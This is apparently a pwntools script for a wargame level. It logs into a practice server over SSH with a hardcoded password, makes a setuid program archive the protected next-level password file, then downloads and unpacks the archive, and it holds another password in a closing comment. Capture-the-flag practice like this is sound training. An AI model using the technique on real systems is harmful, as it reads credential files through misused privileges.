from pwn import *


local_dir = None
remote_binary = None
local_binary = None
libc = None
port = None
elf = None
def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/vortex/"+level
    remote_binary = "/vortex/vortex"+level
    cloned_binary = local_dir+remote_binary
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


# def find_tar_pid(s):
#     while True:
#         io = s.process(["pidof", "tar"])
#         io.re
# thread = threading.Thread(target=find_tar_pid, args=(s,))

s = connect("2", "23anbT\\rE")

# create files to archive
s.process("echo gil1 > /tmp/gil1", shell=True)
s.process("echo gil2 > /tmp/gil2", shell=True)

io = s.process("sh -c 'echo $$; exec " + remote_binary + " /tmp/gil1 /tmp/gil2 /etc/vortex_pass/vortex3'", shell=True)
result = pid = io.recvall().decode("utf-8")
log.info(f"result: {result}")
pid = result.split("\n")[0].strip()
log.info(f"pid: {pid}")

archive = "/tmp/ownership."+pid+".tar"
io = s.process(["file", archive ])
file_output = io.recvall()
log.info(f"file_output: {file_output}")
polled = io.poll()
log.info(f"polled ret code: {polled}")

assert polled == 0

d_archive = s.download(archive)
pass_data = process(["tar", "xf", d_archive]).recvall()
log.info(f"pass_data: {pass_data}")

# unpack archive in /tmp/ or download with scp
# tar throws error for us -> unsolvable
'''
/bin/tar: UW1\377VS\350\305\376\377\377\201\303u\033: 
Cannot stat: No such file or directory
/bin/tar: Exiting with failure status due to previous errors
'''

# 64ncXTvx#

